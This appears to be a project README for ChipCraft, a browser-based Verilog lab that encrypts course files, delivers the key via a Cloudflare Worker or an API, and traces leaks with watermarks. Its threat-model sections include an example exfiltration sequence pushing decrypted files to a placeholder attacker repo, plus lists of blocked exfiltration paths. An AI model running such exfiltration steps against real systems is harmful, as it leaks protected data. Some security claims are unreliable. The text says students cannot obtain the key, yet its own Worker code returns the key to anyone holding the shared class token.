# ChipCraft Lab — How It Works

## Overview

ChipCraft is a browser-based VLSI lab platform. Students log in with GitHub, get a
private Linux desktop (XFCE + VNC) in their browser, and work with Verilog files
using Verilator, iverilog, and GTKWave — without installing anything locally.

The Verilog lab files are **encrypted at rest**. Students can edit and compile them
inside the container, but they cannot extract the plaintext or the encryption key.

The encryption key is delivered via a **Cloudflare Worker** — it never appears as
an environment variable in the container, so `docker inspect` reveals nothing useful.

---

## GitHub Repositories

| Repo | URL | Purpose |
|---|---|---|
| `chipcraft-lab` | github.com/narrave/chipcraft-lab | Infrastructure — Dockerfile, API, entrypoint, tools |
| `chipcraft-lab-files` | github.com/narrave/chipcraft-lab-files | Lab files — encrypted `.v.enc` files + Makefile |
| `chipcraft-student` | github.com/narrave/chipcraft-student | VS Code Codespace launch only (devcontainer) |

> **`chipcraft-lab-files` is public** (files are encrypted so sharing them is safe).
> The API forks it into each student account on login (Server Mode).
> In Codespace/Docker Mode, students clone it directly.

---

## System Architecture

```
+--------------------------------------------------------------------------+
|  TEACHER'S PC                                                            |
|                                                                          |
|  counter.v  --encrypt-->  counter.v.enc  --push-->  chipcraft-lab-files |
|  (private)    encrypt_lab.sh   (safe to share)      github.com/narrave   |
+--------------------------------------------------------------------------+
                                                              |
                                              Cloned into ~/lab/ per student
                                                              |
+--------------------------------------------------------------------------+
|  SERVER  (docker compose up)                                             |
|                                                                          |
|  +------------------+        +---------------------------------------+   |
|  |  API Service     |        |  Student Container (one per student)  |   |
|  |  port 80         |        |                                       |   |
|  |                  |        |  ~/lab/            (git repo)         |   |
|  |  CHIPCRAFT_KEY   |<------>|    counter.v.enc   <- re-encrypted    |   |
|  |  in memory only  |one-time|    tb_counter.v.enc                   |   |
|  |                  | token  |    Makefile                           |   |
|  |  GitHub OAuth    |        |    mywork/         <- student .v files|   |
|  +------------------+        |                                       |   |
|                               |  ~/labs/           (tmpfs - RAM only) |   |
|                               |    counter.v       <- student edits   |   |
|                               |    tb_counter.v                       |   |
|                               |    Makefile                           |   |
|                               |                                       |   |
|                               |  Browser VNC desktop (noVNC 6080)    |   |
|                               +---------------------------------------+   |
+--------------------------------------------------------------------------+
                                       |
                                 Student's browser
                          (sees XFCE desktop via noVNC)
```

---

## Components

| File / Service | Repo | Role |
|---|---|---|
| `tools/encrypt_lab.sh` | chipcraft-lab | Teacher encrypts `.v` files on their PC |
| `tools/decrypt_watch.sh` | chipcraft-lab | Container — decrypts on startup, re-encrypts on save |
| `tools/watermark.py` | chipcraft-lab | Embeds / reads invisible trailing-space watermark |
| `tools/detect_leak.sh` | chipcraft-lab | Teacher tool — identifies student from a leaked file |
| `tools/git-wrapper.sh` | chipcraft-lab | Installed as `/usr/local/bin/git` — blocks git outside `~/lab/` |
| `api/main.py` | chipcraft-lab | FastAPI — GitHub OAuth, container launch, key delivery |
| `router/app.py` | chipcraft-lab | Load balancer across student containers |
| `Dockerfile` | chipcraft-lab | Builds student desktop image (XFCE + VNC + Verilator) |
| `entrypoint.sh` | chipcraft-lab | Container startup — VNC, firewall, decrypt_watch |
| `docker-compose.yml` | chipcraft-lab | Defines API service and build targets |
| `.env` | server only | Server-side secrets — never committed |
| `*.v.enc` | chipcraft-lab-files | Encrypted Verilog lab files |
| `mywork/` | chipcraft-lab-files | Student-created work (only `.v.enc` files — auto-encrypted on save) |
| `Makefile` | chipcraft-lab-files | `make` / `make wave` / `make clean` |
| `.gitignore` | chipcraft-lab-files | Blocks everything; only `*.enc` and repo infra files allowed |
| `.devcontainer/setup.sh` | chipcraft-student | Codespace startup — clones lab, fetches key, starts decrypt, registers pre-commit hook |
| `.devcontainer/devcontainer.json` | chipcraft-student | Codespace config — image, ports, postAttachCommand |
| `tools/pre-commit` | chipcraft-lab (image) | Git hook baked into Docker image at `/usr/local/lib/chipcraft-hooks/` — root-owned, students cannot edit |

---

## Deployment Options

Three ways to run ChipCraft. Choose based on your needs:

| | Codespace Mode | Local Docker Mode | Server Mode |
|---|---|---|---|
| **What runs where** | Student's own Codespace | Student's own laptop/PC | VPS / cloud server |
| **Cost** | Free (GitHub Codespaces) | Free (Docker Desktop) | ~$4-6/month |
| **Key hidden from students?** | Yes — via Cloudflare Worker | Yes — key only in Cloudflare | Yes — never in student env |
| **Setup time** | 10 minutes | 10 minutes | 30 minutes |
| **Best for** | Quick classes, no local installs | Small groups, offline use | Real lab, best security |
| **Requires internet** | Yes | Only to pull image and fetch key | Yes |

---

## Encryption — Teacher Side

### The Key

The encryption key is an AES-256 passphrase set by the teacher.
It lives in **two places only**:

1. The teacher's terminal (`CHIPCRAFT_KEY` env var) when encrypting
2. Cloudflare Worker secrets (delivers key at runtime, hidden from all students)

It is **never** stored in:
- The Docker image
- Any GitHub repository
- The student container's environment

### Encrypting Files

```bash
# On teacher's PC (Git Bash / WSL / Mac / Linux)
export CHIPCRAFT_KEY="your-secret-key"

# Encrypt a single file
bash NVR/tools/encrypt_lab.sh counter.v
# -> counter.v.enc

# Encrypt all .v files in a folder at once
bash NVR/tools/encrypt_lab.sh labs/
```

`encrypt_lab.sh` uses **AES-256-CBC with PBKDF2** (openssl):

```
openssl enc -aes-256-cbc -pbkdf2 -salt -k "$KEY" -in counter.v -out counter.v.enc
```

### Pushing Encrypted Files to chipcraft-lab-files

Only encrypted files go to GitHub. The `.gitignore` blocks everything except `.enc` files:

```
*            <- block everything by default
!.gitignore  <- allow repo infrastructure
!Makefile
!*.enc       <- the only data files allowed are encrypted Verilog
```

```bash
cd chipcraft-lab-files
cp ../labs/*.v.enc .
git add *.v.enc
git commit -m "lab1: counter"
git push
```

---

## Key Delivery — How the Container Gets the Key

The key is delivered via one of four methods, tried in order:

```
Priority 1 — Server Mode (API bootstrap token)
  Container calls  POST http://api:8000/lab-key  with BOOTSTRAP_TOKEN
  API validates the one-time token and returns CHIPCRAFT_KEY

Priority 2 — Codespace / Local Docker (Cloudflare Worker)
  setup.sh or decrypt_watch.sh sends CLASS_TOKEN to Cloudflare Worker
  Worker validates CLASS_TOKEN and returns CHIPCRAFT_KEY
  CHIPCRAFT_KEY is never stored in any environment variable

Priority 3 — Codespace fallback (CHIPCRAFT_KEY direct env var)
  If CHIPCRAFT_KEY is set as a Codespace secret, decrypt_watch.sh reads it

Priority 4 — Development / testing (LAB_KEY env var)
  If LAB_KEY is set locally, use it for local testing
```

---

## Cloudflare Worker — Hiding the Key

In **Codespace Mode** and **Local Docker Mode**, the key is delivered via a
free **Cloudflare Worker** instead of a local API server.

### Why it is needed

In Local Docker Mode, anyone can run `docker inspect <container>` and see all
environment variables — including secrets passed with `-e`. The Cloudflare
Worker prevents this by keeping `CHIPCRAFT_KEY` out of the container entirely.

### How it works

```
Teacher sets two secrets in Cloudflare dashboard:
  CLASS_TOKEN   = vlsi2026    <- shared with students (door pass, not the key)
  CHIPCRAFT_KEY = your-key    <- never shared (real encryption key)

Student container has CLASS_TOKEN in its environment:
  (visible in docker inspect, but harmless — it is just a door pass)

When decrypt_watch.sh needs the key:
  POST https://chipcraft-key.nagajyothibonthagorla.workers.dev
  Body: { "class_token": "vlsi2026", "user": "student_github_name" }

Worker checks CLASS_TOKEN:
  Match    -> returns { "key": "your-key" }
  No match -> returns 401 Unauthorized

CHIPCRAFT_KEY never leaves Cloudflare.
Students can only ever see CLASS_TOKEN (the door pass, not the vault).
```

### Cloudflare Worker code

```javascript
export default {
  async fetch(request, env) {
    if (request.method !== "POST") return new Response("Not allowed", { status: 405 });
    let body;
    try { body = await request.json(); }
    catch { return new Response("Bad request", { status: 400 }); }
    const { class_token, user } = body;
    if (!class_token || class_token !== env.CLASS_TOKEN)
      return new Response("Unauthorized", { status: 401 });
    console.log(`Key issued to: ${user}`);
    return Response.json({ key: env.CHIPCRAFT_KEY });
  }
};
```

### Setting up the Worker (teacher does once)

```
1. Go to cloudflare.com -> Workers & Pages -> Create application
2. Choose "Start with Hello World" -> name it chipcraft-key -> Deploy
3. Open the worker -> Edit code -> paste the code above -> Deploy
4. Go to Settings -> Variables and Secrets -> Add:
     CLASS_TOKEN   = vlsi2026        (give this to students)
     CHIPCRAFT_KEY = your-key        (keep this to yourself)
5. Update WORKER_URL in:
     NVR/tools/decrypt_watch.sh
     chipcraft-student/.devcontainer/setup.sh
```

---

## Server Mode — Key Delivery Step by Step

```
1. Teacher sets CHIPCRAFT_KEY in .env on server

2. docker compose up  ->  API container reads CHIPCRAFT_KEY into memory

3. Student logs in via GitHub OAuth

4. API forks chipcraft-lab-files -> student GitHub account
   API clones student fork       -> ~/lab/ inside the container

5. API generates BOOTSTRAP_TOKEN (32 random bytes, expires in 30 seconds)
   API launches student container with BOOTSTRAP_TOKEN only
   (CHIPCRAFT_KEY is NOT passed to the student container)

6. Container starts -> decrypt_watch.sh runs

7. decrypt_watch.sh calls:
   POST http://api:8000/lab-key  { "token": "<BOOTSTRAP_TOKEN>" }
   (over internal Docker network — not reachable from student browser)

8. API validates: IP check + not expired + single-use

9. API returns CHIPCRAFT_KEY; decrypt_watch.sh stores it in bash variable;
   BOOTSTRAP_TOKEN immediately unset from environment

10. openssl decrypts ~/lab/counter.v.enc -> ~/labs/counter.v  (tmpfs RAM)
    Invisible watermark embedded in the decrypted file

11. Student opens ~/labs/counter.v and starts working
```

### Why students cannot steal the key

| Attack | Blocked because |
|---|---|
| `env` in terminal | BOOTSTRAP_TOKEN already consumed and unset; CHIPCRAFT_KEY was never there |
| `curl http://api:8000/lab-key` | Token already used — returns 401 |
| Copy `.v.enc` file and decrypt | They do not have the key |
| Read `.env` file | On the server — not inside the container |
| `docker inspect api` | Requires Docker daemon access — students do not have it |

---

## Decryption — Inside the Container

`decrypt_watch.sh` runs as a background process inside every student container.

### On container startup

```
~/lab/counter.v.enc       (student git repo)
         |
         |  openssl dec -k "$KEY"
         |  watermark.py encode "@github_user"
         v
~/labs/counter.v          (tmpfs — RAM only, never touches disk)
~/labs/tb_counter.v
~/labs/Makefile           (copied from ~/lab/)
```

### On every student save

```
Student saves ~/labs/counter.v         (teacher lab file)
         |
         |  inotifywait detects close_write
         v
openssl enc -k "$KEY"
         |
         v
~/lab/counter.v.enc       (updated — matching .enc existed in ~/lab/)

Student saves ~/labs/my_adder.v        (student new file)
         |
         |  inotifywait detects close_write
         v
openssl enc -k "$KEY"
         |
         v
~/lab/mywork/my_adder.v.enc   (created in mywork/ — no prior .enc existed)
         |
         v
cd ~/lab && git add mywork/my_adder.v.enc && git push
```

### tmpfs — why it matters

`/home/ubuntu/labs` is a **RAM-only filesystem** (tmpfs, 100 MB).

- Decrypted `.v` files exist **only in memory** while the container runs
- When the container stops, they vanish automatically
- No plaintext is ever written to the host disk or the Docker volume

### Which files get encrypted on save

Every `.v` file save is encrypted. Teacher files update their existing `.enc` in `~/lab/`; student-created new files are encrypted into `~/lab/mywork/`.

| File saved | `~/lab/*.v.enc` exists? | Action |
|---|---|---|
| `counter.v` (teacher lab file) | Yes | Re-encrypted → `~/lab/counter.v.enc` |
| `tb_counter.v` (teacher lab file) | Yes | Re-encrypted → `~/lab/tb_counter.v.enc` |
| `my_adder.v` (student new file) | No | Encrypted → `~/lab/mywork/my_adder.v.enc` |
| `seq_circuit.v` (student new file) | No | Encrypted → `~/lab/mywork/seq_circuit.v.enc` |

---

## Git Wrapper — Security Restriction

The Docker image installs a **git wrapper at `/usr/local/bin/git`** that sits in
front of the real git binary. This prevents students from pushing decrypted files
outside the lab repository.

### What the wrapper blocks

| Command | From where | Result |
|---|---|---|
| `git init` | Anywhere | Blocked — `[ChipCraft] git init is not allowed in this lab.` |
| `git clone` | Anywhere | Blocked — `[ChipCraft] git clone is not allowed in this lab.` |
| `git add` / `git commit` / `git push` | Outside `~/lab/` | Blocked — `[ChipCraft] git is only allowed inside ~/lab/.` |
| `git add counter.v` (plain `.v`) | Inside `~/lab/` | Silently ignored by `.gitignore` |
| `git add -f counter.v` then `git commit` | Inside `~/lab/` | Blocked by pre-commit hook (baked in image, read-only) — `COMMIT BLOCKED: only .enc files may be added` |
| `git add counter.v.enc` | Inside `~/lab/` | Allowed — encrypted file |
| `git commit` / `git push` with only `.enc` files | Inside `~/lab/` | Allowed — normal workflow |
| All other commands (log, diff, status…) | Anywhere | Allowed |

### Without the wrapper, a student could

```bash
cd ~/labs                   # decrypted files are here
git init                    # creates a new repo
git add counter.v           # stages the decrypted file
git commit -m "stolen"
git push <attacker_repo>    # sends plaintext to their personal repo
```

With the wrapper, `git init` exits immediately with an error.

### Pre-commit hook — not editable by students

`setup.sh` registers `~/lab` to use the hook baked into the image:

```bash
/usr/bin/git -C "$HOME/lab" config core.hooksPath /usr/local/lib/chipcraft-hooks
```

The hook file is at `/usr/local/lib/chipcraft-hooks/pre-commit` — owned by root,
not writable by the `ubuntu` user. Students cannot modify or delete it.

### Internal tools bypass the wrapper

`setup.sh` and `decrypt_watch.sh` call `/usr/bin/git` directly (not the wrapper)
so that automated cloning and pushing of encrypted files works correctly.

---

## Student Workflow

### Codespace Mode

```
1. Teacher gives you CLASS_TOKEN (e.g. vlsi2026)
2. Open github.com/narrave/chipcraft-student
3. Click Code -> Open in Codespace
4. Wait ~2 minutes for the container to start
5. The XFCE desktop opens automatically in your browser (port 6080)
6. Open terminal -> cd ~/labs && make
```

How setup.sh works when you attach:

```
postAttachCommand fires (runs AFTER Codespace secrets are injected):
  |
  +-- git clone chipcraft-lab-files -> ~/lab/
  |
  +-- Sends CLASS_TOKEN to Cloudflare Worker
  |     -> Worker validates CLASS_TOKEN
  |     -> Returns CHIPCRAFT_KEY (stored as LAB_KEY — not kept in env after use)
  |
  +-- Kills earlier decrypt_watch (started before ~/lab/ existed)
  +-- Restarts decrypt_watch.sh with LAB_KEY exported to subprocess
  |
  +-- ~/labs/ fills with decrypted .v files
```

> **postAttachCommand** is used (not postStartCommand) because Codespace secrets
> are only available after the user attaches, not during container start.

### Local Docker Mode

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker run -d \
  -p 6080:6080 \
  -e CLASS_TOKEN=vlsi2026 \
  -e GITHUB_USER=your_github_name \
  ghcr.io/narrave/chipcraft:latest
# Open http://localhost:6080 in your browser
```

The container fetches the key from the Cloudflare Worker using CLASS_TOKEN.

### Edit and compile (all modes)

```bash
cd ~/labs
make              # compile + simulate
make wave         # compile + simulate + open GTKWave
make clean        # remove build outputs
```

### Save lab work to GitHub

```bash
cd ~/lab
git add *.v.enc
git commit -m "lab1 solution"
git push
```

### Save your own files (mywork/)

```bash
# Create your file anywhere in ~/labs/
cd ~/labs
vim my_adder.v
# decrypt_watch.sh automatically encrypts it -> ~/lab/mywork/my_adder.v.enc

# Commit the encrypted version to GitHub
cd ~/lab
git add mywork/my_adder.v.enc
git commit -m "my adder design"
git push
```

Student-created files are auto-encrypted to `~/lab/mywork/*.v.enc` on every save.
Only `.enc` files can be committed — the pre-commit hook blocks any plain `.v` or other file type.
The hook lives in the Docker image at `/usr/local/lib/chipcraft-hooks/pre-commit` (root-owned) so students cannot edit or delete it.

---

## Server Setup (Teacher)

### 1. Create `.env` on the server

```bash
# NVR/.env   (never commit this file)
CHIPCRAFT_KEY=your-secret-key-here
GH_CLIENT_ID=your_github_oauth_app_id
GH_CLIENT_SECRET=your_github_oauth_secret
VNC_PASSWORD=novnc
TEMPLATE_REPO=narrave/chipcraft-lab-files
SESSION_TTL=14400
PORT_START=6081
PORT_END=6180
```

### 2. Get the Docker image (GitHub Actions builds it automatically)

Every push to `master` that touches `Dockerfile`, `entrypoint.sh`, or
`tools/decrypt_watch.sh` triggers **GitHub Actions -> Publish Docker Image**
which builds and pushes `ghcr.io/narrave/chipcraft:latest` automatically.

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker tag ghcr.io/narrave/chipcraft:latest ubuntu-novnc:latest
cd NVR
docker compose up -d
```

To roll out a new image after a code push:

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker tag  ghcr.io/narrave/chipcraft:latest ubuntu-novnc:latest
# New student containers will use the updated image automatically.
```

### 3. Encrypt and push lab files

```bash
export CHIPCRAFT_KEY="your-secret-key-here"
bash NVR/tools/encrypt_lab.sh counter.v
bash NVR/tools/encrypt_lab.sh tb_counter.v

cd chipcraft-lab-files
cp ../counter.v.enc ../tb_counter.v.enc .
git add *.v.enc
git commit -m "lab1: counter"
git push
```

---

## Codespace Setup (Teacher)

```bash
# 1. Deploy Cloudflare Worker (see Cloudflare section above)
#    Set CLASS_TOKEN and CHIPCRAFT_KEY as Worker secrets

# 2. Set Codespace secret  (CLASS_TOKEN only — NOT CHIPCRAFT_KEY)
#    github.com/settings/codespaces -> New secret
#    Name: CLASS_TOKEN  Value: vlsi2026  Repo: chipcraft-student

# 3. Encrypt lab files
export CHIPCRAFT_KEY="your-key"
bash NVR/tools/encrypt_lab.sh counter.v
cp counter.v.enc chipcraft-lab-files/
cd chipcraft-lab-files && git add *.v.enc && git commit -m "lab1" && git push

# 4. Make chipcraft-lab-files PUBLIC
#    github.com/narrave/chipcraft-lab-files -> Settings -> Change visibility -> Public

# 5. Invite students to chipcraft-student as collaborators
#    github.com/narrave/chipcraft-student -> Settings -> Collaborators
```

---

## File Layout Inside the Container

```
/home/ubuntu/
|
+-- lab/                        <- git repo (persistent)
|   +-- counter.v.enc           <- re-encrypted on every student save
|   +-- tb_counter.v.enc
|   +-- Makefile
|   +-- .gitignore              <- blocks all files; only *.enc allowed
|   +-- mywork/                 <- student work (auto-encrypted on save)
|       +-- my_adder.v.enc      <- only .enc files here, committed to git
|
+-- labs/                       <- tmpfs (RAM only — vanishes when container stops)
    +-- counter.v               <- decrypted, watermarked — student edits here
    +-- tb_counter.v
    +-- my_adder.v              <- student file (auto-encrypted to ~/lab/mywork/)
    +-- Makefile                <- copied from ~/lab/ at startup
    +-- sim.vvp                 <- generated by iverilog
    +-- counter.vcd             <- generated by simulation, opened in GTKWave
```

---

## File Exfiltration — Possible Attack Paths

| Attack method | Blocked? | How |
|---|---|---|
| **noVNC clipboard** copy | Blocked | `-noclipboard` on Xvnc server |
| **git push decrypted files** from `~/labs/` | Blocked | git wrapper blocks `git add` outside `~/lab/` |
| **git init** anywhere | Blocked | git wrapper blocks `git init` everywhere |
| **git clone** to push to a private repo | Blocked | git wrapper blocks `git clone` everywhere |
| **curl / wget** to paste sites | Blocked | Egress firewall — only GitHub IPs allowed |
| **Browser inside VNC** to Google Drive, email | Blocked | Egress firewall |
| **`docker inspect`** to see CHIPCRAFT_KEY | Not possible | Key delivered via Cloudflare Worker — never an env var in the container |
| **`echo $CLASS_TOKEN`** | Visible | CLASS_TOKEN is a door pass, not the key — harmless |
| **`docker cp`** from host | Admin only | Requires Docker daemon access |
| **Phone photo / screen recording** | Cannot block | Watermark identifies the student |
| **Manual typing** the code | Cannot block | Watermark + academic integrity policy |

---

## Watermarking — Tracing Leaked Files

Every decrypted `.v` file receives two watermarks automatically.
The student's GitHub username (from `GITHUB_USER` env var) is embedded uniquely
per container — no manual step needed.

### Visible watermark (decoy)

```verilog
// [ChipCraft] Student: @john_student | 2026-06-19
module counter #( ...
```

### Invisible watermark (real trap)

The student's GitHub username is encoded as **binary bits into trailing spaces**
on each line — completely invisible to readers and most editors. When the student
deletes the visible comment, the invisible watermark is still present.

### How to detect a leaked file (teacher tool)

```bash
export CHIPCRAFT_KEY="your-secret-key"

bash NVR/tools/detect_leak.sh leaked_counter.v
# -> Leaked file : leaked_counter.v
# -> Student     : @john_student

bash NVR/tools/detect_leak.sh counter.v.enc    # auto-decrypts first
```

---

## Egress Firewall

Each student container starts with iptables rules blocking all outbound traffic:

```
ALLOWED outbound:
  +-- Loopback (127.0.0.1)
  +-- Docker internal network (172.x, 10.x)   <- API key delivery (Server Mode)
  +-- DNS (port 53)
  +-- GitHub IP ranges (port 443 / 22)        <- git push only

BLOCKED outbound:
  +-- Everything else — paste sites, email, file sharing, cloud storage
```

---

## Security Summary

```
CHIPCRAFT_KEY journey (Codespace / Local Docker):
  Cloudflare Worker secrets (teacher access only)
    -> POST /worker (CLASS_TOKEN validated, CHIPCRAFT_KEY returned in response)
      -> bash variable in decrypt_watch.sh (~2 seconds)
        -> openssl stdin  ->  GONE

CHIPCRAFT_KEY journey (Server Mode):
  .env (server — teacher access only)
    -> API memory
      -> POST /lab-key (internal network, one-time token, 30s TTL)
        -> bash variable in decrypt_watch.sh
          -> openssl stdin  ->  GONE

CLASS_TOKEN (Codespace / Local Docker):
  Visible in student environment.
  It is a door pass, not the encryption key.
  Students can see it but cannot use it to obtain CHIPCRAFT_KEY directly.
  The Cloudflare Worker validates it but never exposes the key elsewhere.

Decrypted .v files:
  ~/labs/ (tmpfs, RAM only)  ->  watermarked per student  ->  GONE on container stop

Encrypted .v.enc files:
  chipcraft-lab-files repo + ~/lab/ volume  ->  safe anywhere  ->  useless without key

Git operations:
  /usr/local/bin/git (wrapper) blocks init/clone everywhere
  and blocks add/commit/push outside ~/lab/
  Internal tools use /usr/bin/git directly — unaffected

If a file leaks:
  detect_leak.sh  ->  reads invisible trailing-space watermark  ->  names the student
```
